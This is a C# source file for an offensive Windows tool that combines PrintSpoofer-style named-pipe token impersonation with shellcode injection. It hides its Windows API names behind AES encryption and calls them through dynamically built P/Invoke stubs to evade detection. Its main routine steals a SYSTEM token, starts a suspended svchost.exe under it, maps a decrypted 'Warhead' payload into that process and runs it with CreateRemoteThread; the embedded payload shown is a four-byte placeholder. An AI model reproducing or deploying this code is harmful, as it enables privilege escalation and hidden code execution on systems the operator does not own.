using System;
using System.IO;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace AES_Shellcode_Injection_Alternative_Dynamic_Invoke_PrintSpooferNet
{
    class Program
    {
        static string GlobalKey = "03c7/E/C9/Ko3OP7ZKCwV8Isd7/m/+DV8fXzgLOHmIA=";
        static string GlobalIV = "Ghe9hi91Qz48YN4jvf4AVg==";    

        static byte[] dKernel32_dll_Bytes = new byte[16] { 0xA6, 0x68, 0x35, 0x0E, 0x3B, 0x19, 0x15, 0x78, 0xE7, 0x2F, 0x6A, 0x08, 0xC4, 0xC5, 0x1E, 0xD3 };
        static string dKernel32_dll = DecryptAESAsString(dKernel32_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dntdll_dll_Bytes = new byte[16] { 0x4B, 0x39, 0x94, 0x58, 0xA8, 0xAD, 0x42, 0x25, 0xB0, 0x01, 0x1D, 0x9A, 0x17, 0x03, 0x9B, 0xD1 };
        static string dntdll_dll = DecryptAESAsString(dntdll_dll_Bytes, GlobalKey, GlobalIV);

        static byte[] dCreateRemoteThread_Bytes = new byte[32] { 0x99, 0x11, 0xB2, 0xE0, 0x81, 0xEC, 0x79, 0x92, 0xE2, 0x45, 0x8A, 0x17, 0x23, 0x3A, 0xFC, 0x8F, 0x27, 0x94, 0xAD, 0x70, 0xDB, 0x0B, 0x81, 0x3D, 0xBB, 0x0B, 0x05, 0x41, 0x56, 0x20, 0xF2, 0xAB };
        static string dCreateRemoteThread = DecryptAESAsString(dCreateRemoteThread_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtClose_Bytes = new byte[16] { 0x65, 0xA0, 0x0A, 0x15, 0x68, 0x6D, 0x0C, 0x89, 0x60, 0x47, 0x65, 0x83, 0x9B, 0x34, 0xEE, 0x6A };
        static string dNtClose = DecryptAESAsString(dNtClose_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtCreateSection_Bytes = new byte[16] { 0x69, 0xF9, 0x0C, 0xFC, 0xB9, 0xBA, 0x70, 0x77, 0x1F, 0xD0, 0x11, 0x32, 0x1F, 0xCC, 0x5E, 0x4B };
        static string dNtCreateSection = DecryptAESAsString(dNtCreateSection_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtMapViewOfSection_Bytes = new byte[32] { 0x9A, 0x59, 0x72, 0x6F, 0xF8, 0x5D, 0x8B, 0x75, 0xF7, 0x83, 0xA1, 0xBB, 0xD3, 0xAE, 0xB1, 0x86, 0xA7, 0x2F, 0x14, 0xA9, 0x35, 0x04, 0xED, 0xA4, 0x7E, 0x7A, 0x9B, 0x0C, 0x10, 0xF7, 0x3C, 0xBB };
        static string dNtMapViewOfSection = DecryptAESAsString(dNtMapViewOfSection_Bytes, GlobalKey, GlobalIV);

        static byte[] dNtUnmapViewOfSection_Bytes = new byte[32] {  0x94, 0x00, 0xB0, 0x3B, 0x0C, 0x3D, 0x4A, 0x68, 0x8C, 0xFE, 0xB1, 0x32, 0x55, 0x83, 0x5F, 0x1B, 0x7E, 0x8D, 0x43, 0x59, 0xA7, 0x79, 0xF0, 0x5C, 0x49, 0xEB, 0x29, 0x5C, 0x87, 0x07, 0x9D, 0x43};
        static string dNtUnmapViewOfSection = DecryptAESAsString(dNtUnmapViewOfSection_Bytes, GlobalKey, GlobalIV);

        static byte[] dCreateProcessWithTokenW_Bytes = new byte[32] {  0x0C, 0x7F, 0xAC, 0xA7, 0xB7, 0xB0, 0xE7, 0x8B, 0xB0, 0xE2, 0x3E, 0x46, 0x82, 0xEB, 0x25, 0xF6, 0x48, 0x4E, 0x96, 0x2A, 0xED, 0xE1, 0x8F, 0xAA, 0x07, 0xF2, 0xF4, 0x07, 0xDE, 0x38, 0xDE, 0x9F  };
        static string dCreateProcessWithTokenW = DecryptAESAsString(dCreateProcessWithTokenW_Bytes, GlobalKey, GlobalIV);

        static byte[] dCreateNamedPipe_Bytes = new byte[16] { 0x4F, 0xF2, 0x78, 0xB4, 0x7A, 0xF0, 0x35, 0x5D, 0x03, 0xF7, 0xA8, 0xE3, 0x4B, 0x6B, 0x5D, 0xA6 };
        static string dCreateNamedPipe = DecryptAESAsString(dCreateNamedPipe_Bytes, GlobalKey, GlobalIV);

        static byte[] dConnectNamedPipe_Bytes = new byte[32] { 0x1E, 0x23, 0x83, 0x99, 0x1C, 0x1A, 0x12, 0x83, 0x67, 0xB8, 0x93, 0xCD, 0x02, 0xC2, 0x63, 0xC1, 0x50, 0xD9, 0xDF, 0x98, 0x78, 0x6D, 0x85, 0x93, 0x5D, 0x95, 0xC6, 0x63, 0x88, 0x90, 0xBE, 0xAB };
        static string dConnectNamedPipe = DecryptAESAsString(dConnectNamedPipe_Bytes, GlobalKey, GlobalIV);

        static byte[] dImpersonateNamedPipeClient_Bytes = new byte[32] {  0x6B, 0x02, 0x71, 0x41, 0x18, 0x63, 0x97, 0x0F, 0xA3, 0x47, 0xA1, 0xA1, 0x3E, 0x7C, 0x14, 0x13, 0x46, 0x9A, 0xA8, 0xA0, 0x1B, 0x64, 0xA0, 0x1D, 0xAF, 0xC8, 0x0B, 0x1A, 0x12, 0x5C, 0x75, 0xBB  };
        static string dImpersonateNamedPipeClient = DecryptAESAsString(dImpersonateNamedPipeClient_Bytes, GlobalKey, GlobalIV);

        static byte[] dOpenThreadToken_Bytes = new byte[16] { 0x8B, 0x3F, 0xAE, 0x3B, 0x00, 0x20, 0x46, 0x96, 0x38, 0x0E, 0x11, 0xF4, 0xD1, 0x96, 0x1C, 0x44 };
        static string dOpenThreadToken = DecryptAESAsString(dOpenThreadToken_Bytes, GlobalKey, GlobalIV);

        static byte[] dDuplicateTokenEx_Bytes = new byte[32] { 0xDC, 0x51, 0x25, 0x55, 0xDB, 0x14, 0xA6, 0x0D, 0x6B, 0x86, 0x0D, 0x5C, 0xD3, 0xD8, 0x50, 0x69, 0x6D, 0xEB, 0xD1, 0x55, 0x06, 0x6D, 0x6F, 0x91, 0x9E, 0x15, 0xA1, 0x7D, 0x57, 0xF1, 0xC6, 0x78 };
        static string dDuplicateTokenEx = DecryptAESAsString(dDuplicateTokenEx_Bytes, GlobalKey, GlobalIV);

        static byte[] dadvapi32_dll_Bytes = new byte[16] { 0x5F, 0x3A, 0x49, 0xCD, 0x42, 0xD7, 0x47, 0xB1, 0xF1, 0x7D, 0xD5, 0xD4, 0x5F, 0xDA, 0xDC, 0xE0 };
        static string dadvapi32_dll = DecryptAESAsString(dadvapi32_dll_Bytes, GlobalKey, GlobalIV);
        
      public static object DynamicInvoke(Type returnType, string library, string methodName, object[] arguments, Type[] parameterTypes)
        {
            var assemblyName = new AssemblyName("DynamicAssembly");
            var assemblyBuilder = AppDomain.CurrentDomain.DefineDynamicAssembly(assemblyName, AssemblyBuilderAccess.Run);
            var moduleBuilder = assemblyBuilder.DefineDynamicModule("DynamicModule");

            var methodBuilder = moduleBuilder.DefinePInvokeMethod(
                methodName,
                library,
                MethodAttributes.Public | MethodAttributes.Static | MethodAttributes.PinvokeImpl,
                CallingConventions.Standard,
                returnType,
                parameterTypes,
                CallingConvention.Winapi,
                CharSet.Unicode
            );

            methodBuilder.SetImplementationFlags(methodBuilder.GetMethodImplementationFlags() | MethodImplAttributes.PreserveSig);
            moduleBuilder.CreateGlobalFunctions();
            MethodInfo dynamicMethod = moduleBuilder.GetMethod(methodName);

            return dynamicMethod.Invoke(null, arguments);
        }

        public static bool CreateProcessWithTokenW(IntPtr hToken, UInt32 dwLogonFlags, string lpApplicationName, string lpCommandLine,
           UInt32 dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation)
        {
            var parameterTypes = new Type[]
            {
                typeof(IntPtr), typeof(UInt32), typeof(string), typeof(string), typeof(UInt32),
                typeof(IntPtr), typeof(string), typeof(STARTUPINFO).MakeByRefType(), typeof(PROCESS_INFORMATION).MakeByRefType()
            };
            PROCESS_INFORMATION tempProcessInfo = new PROCESS_INFORMATION();
            var arguments = new object[] { hToken, dwLogonFlags, lpApplicationName, lpCommandLine, dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, tempProcessInfo };
            var result = (bool)DynamicInvoke(typeof(bool), dadvapi32_dll, dCreateProcessWithTokenW, arguments, parameterTypes);
            lpStartupInfo = (STARTUPINFO)arguments[7];
            lpProcessInformation = (PROCESS_INFORMATION)arguments[8];
            return result;
        }
        public static IntPtr CreateNamedPipe(string lpName, uint dwOpenMode, uint dwPipeMode, uint nMaxInstances,
            uint nOutBufferSize, uint nInBufferSize, uint nDefaultTimeOut, IntPtr lpSecurityAttributes)
        {
            var parameterTypes = new Type[] { typeof(string), typeof(uint), typeof(uint), typeof(uint), typeof(uint), typeof(uint), typeof(uint), typeof(IntPtr) };
            var arguments = new object[] { lpName, dwOpenMode, dwPipeMode, nMaxInstances, nOutBufferSize, nInBufferSize, nDefaultTimeOut, lpSecurityAttributes };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dCreateNamedPipe, arguments, parameterTypes);
        }

        public static bool ConnectNamedPipe(IntPtr hNamedPipe, IntPtr lpOverlapped)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr) };
            var arguments = new object[] { hNamedPipe, lpOverlapped };
            return (bool)DynamicInvoke(typeof(bool), dKernel32_dll, dConnectNamedPipe, arguments, parameterTypes);
        }

        public static bool ImpersonateNamedPipeClient(IntPtr hNamedPipe)
        {
            var parameterTypes = new Type[] { typeof(IntPtr) };
            var arguments = new object[] { hNamedPipe };
            return (bool)DynamicInvoke(typeof(bool), dadvapi32_dll, dImpersonateNamedPipeClient, arguments, parameterTypes);
        }

        public static bool OpenThreadToken(IntPtr ThreadHandle, uint DesiredAccess, bool OpenAsSelf, out IntPtr TokenHandle)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(bool), typeof(IntPtr).MakeByRefType() };
            IntPtr tempTokenHandle = IntPtr.Zero;
            var arguments = new object[] { ThreadHandle, DesiredAccess, OpenAsSelf, tempTokenHandle };
            var result = (bool)DynamicInvoke(typeof(bool), dadvapi32_dll, dOpenThreadToken, arguments, parameterTypes);
            TokenHandle = (IntPtr)arguments[3];
            return result;
        }


        public static UInt32 NtCreateSection(ref IntPtr section, UInt32 desiredAccess, IntPtr pAttrs, ref long MaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile)
        {
            var parameterTypes = new Type[] { typeof(IntPtr).MakeByRefType(), typeof(UInt32), typeof(IntPtr), typeof(long).MakeByRefType(), typeof(uint), typeof(uint), typeof(IntPtr) };
            var arguments = new object[] { section, desiredAccess, pAttrs, MaxSize, pageProt, allocationAttribs, hFile };
            var result = (UInt32)DynamicInvoke(typeof(UInt32), dntdll_dll, dNtCreateSection, arguments, parameterTypes);
            section = (IntPtr)arguments[0];
            MaxSize = (long)arguments[3];
            return result;
        }

        public static UInt32 NtMapViewOfSection(IntPtr SectionHandle, IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits,
            IntPtr CommitSize, ref long SectionOffset, ref long ViewSize, uint InheritDisposition, uint AllocationType, uint Win32Protect)
        {
            var parameterTypes = new Type[]
            {
                typeof(IntPtr), typeof(IntPtr), typeof(IntPtr).MakeByRefType(), typeof(IntPtr), typeof(IntPtr),
                typeof(long).MakeByRefType(), typeof(long).MakeByRefType(), typeof(uint), typeof(uint), typeof(uint)
            };
            var arguments = new object[]
            {
                SectionHandle, ProcessHandle, BaseAddress, ZeroBits, CommitSize,
                SectionOffset, ViewSize, InheritDisposition, AllocationType, Win32Protect
            };
            var result = (UInt32)DynamicInvoke(typeof(UInt32), dntdll_dll, dNtMapViewOfSection, arguments, parameterTypes);
            BaseAddress = (IntPtr)arguments[2];
            SectionOffset = (long)arguments[5];
            ViewSize = (long)arguments[6];
            return result;
        }

        public static uint NtUnmapViewOfSection(IntPtr hProc, IntPtr baseAddr)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr) };
            var arguments = new object[] { hProc, baseAddr };
            return (uint)DynamicInvoke(typeof(uint), dntdll_dll, dNtUnmapViewOfSection, arguments, parameterTypes);
        }

        public static int NtClose(IntPtr hObject)
        {
            var parameterTypes = new Type[] { typeof(IntPtr) };
            var arguments = new object[] { hObject };
            return (int)DynamicInvoke(typeof(int), dntdll_dll, dNtClose, arguments, parameterTypes);
        }

        public static IntPtr CreateRemoteThread(
            IntPtr hProcess,
            IntPtr lpThreadAttributes,
            uint dwStackSize,
            IntPtr lpStartAddress,
            IntPtr lpParameter,
            uint dwCreationFlags,
            IntPtr lpThreadId)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(IntPtr), typeof(uint), typeof(IntPtr) };
            var arguments = new object[] { hProcess, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, lpThreadId };
            return (IntPtr)DynamicInvoke(typeof(IntPtr), dKernel32_dll, dCreateRemoteThread, arguments, parameterTypes);
        }

        public static bool DuplicateTokenEx(IntPtr hExistingToken, uint dwDesiredAccess, IntPtr lpTokenAttributes, uint ImpersonationLevel, uint TokenType, out IntPtr phNewToken)
        {
            var parameterTypes = new Type[] { typeof(IntPtr), typeof(uint), typeof(IntPtr), typeof(uint), typeof(uint), typeof(IntPtr).MakeByRefType() };
            IntPtr tempNewToken = IntPtr.Zero;
            var arguments = new object[] { hExistingToken, dwDesiredAccess, lpTokenAttributes, ImpersonationLevel, TokenType, tempNewToken };
            var result = (bool)DynamicInvoke(typeof(bool), dadvapi32_dll, dDuplicateTokenEx, arguments, parameterTypes);
            phNewToken = (IntPtr)arguments[5];
            return result;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        static void Main(string[] args)
        {
            if (args.Length == 0)
            {
                return;
            }

            byte[] Warhead_Bytes = new byte[4] { 0x0C, 0x8F, 0x53, 0x52 };
            byte[] Warhead = DecryptAESAsBytes(Warhead_Bytes, "k7FrMO63NIAXsxKdsJ/61FSaRW00ioCT+F6kDq4XwdU=", "Z57r6gCOPpj5NWgriwMAbw==");

            string pipeName = args[0];
            IntPtr hPipe = CreateNamedPipe(pipeName, 3, 0, 10, 0x1000, 0x1000, 0, IntPtr.Zero);
            ConnectNamedPipe(hPipe, IntPtr.Zero);
            ImpersonateNamedPipeClient(hPipe);

            IntPtr hToken;
            OpenThreadToken((IntPtr)(-2), 0xF01FF, false, out hToken);

            IntPtr hSystemToken = IntPtr.Zero;
            DuplicateTokenEx(hToken, 0xF01FF, IntPtr.Zero, 2, 1, out hSystemToken);

            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            STARTUPINFO si = new STARTUPINFO();
            si.cb = Marshal.SizeOf(si);

            uint dwCreationFlags = 0x00000004 | 0x08000000;  // CREATE_SUSPENDED | CREATE_NO_WINDOW
            CreateProcessWithTokenW(hSystemToken, 0, null, "C:\\Windows\\System32\\svchost.exe", dwCreationFlags, IntPtr.Zero, null, ref si, out pi);

            long buffer_size = Warhead.Length;

            IntPtr ptr_section_handle = IntPtr.Zero;
            UInt32 create_section_status = NtCreateSection(ref ptr_section_handle, 0xe, IntPtr.Zero, ref buffer_size, 0x40, 0x08000000, IntPtr.Zero);

            long local_section_offset = 0;
            IntPtr ptr_local_section_addr = IntPtr.Zero;
            UInt32 local_map_view_status = NtMapViewOfSection(ptr_section_handle, (IntPtr)(-1), ref ptr_local_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x04);

            Marshal.Copy(Warhead, 0, ptr_local_section_addr, Warhead.Length);

            IntPtr ptr_remote_section_addr = IntPtr.Zero;
            UInt32 remote_map_view_status = NtMapViewOfSection(ptr_section_handle, pi.hProcess, ref ptr_remote_section_addr, IntPtr.Zero, IntPtr.Zero, ref local_section_offset, ref buffer_size, 0x2, 0, 0x20);

            NtUnmapViewOfSection((IntPtr)(-1), ptr_local_section_addr);
            NtClose(ptr_section_handle);

            CreateRemoteThread(pi.hProcess, IntPtr.Zero, 0, ptr_remote_section_addr, IntPtr.Zero, 0, IntPtr.Zero);
        }

        static string DecryptAESAsString(byte[] data, string keyBase64, string ivBase64)
        {
            byte[] decryptedBytes = DecryptAESAsBytes(data, keyBase64, ivBase64);
            return Encoding.UTF8.GetString(decryptedBytes);
        }

        static byte[] DecryptAESAsBytes(byte[] data, string keyBase64, string ivBase64)
        {
            byte[] key = Convert.FromBase64String(keyBase64);
            byte[] iv = Convert.FromBase64String(ivBase64);

            using (Aes aes = Aes.Create())
            {
                aes.Key = key;
                aes.IV = iv;

                using (ICryptoTransform decryptor = aes.CreateDecryptor(aes.Key, aes.IV))
                using (MemoryStream memoryStream = new MemoryStream(data))
                using (CryptoStream cryptoStream = new CryptoStream(memoryStream, decryptor, CryptoStreamMode.Read))
                {
                    byte[] decryptedBytes = new byte[data.Length];
                    int decryptedByteCount = cryptoStream.Read(decryptedBytes, 0, decryptedBytes.Length);

                    byte[] result = new byte[decryptedByteCount];
                    Array.Copy(decryptedBytes, result, decryptedByteCount);
                    return result;
                }
            }
        }
    }
}
